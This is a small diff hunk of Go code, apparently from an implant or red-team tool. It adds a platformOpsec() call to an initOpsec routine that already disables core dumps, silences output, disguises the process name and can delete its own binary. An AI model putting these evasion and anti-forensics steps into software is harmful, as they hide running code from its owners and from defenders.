@@ -13,6 +13,7 @@ func initOpsec(procName string, selfDelete bool) {
 	disableCoreDumps()
 	silenceOutput()
 	masqueradeProcess(procName)
+	platformOpsec()
 	if selfDelete {
 		selfDeleteBinary()
 	}
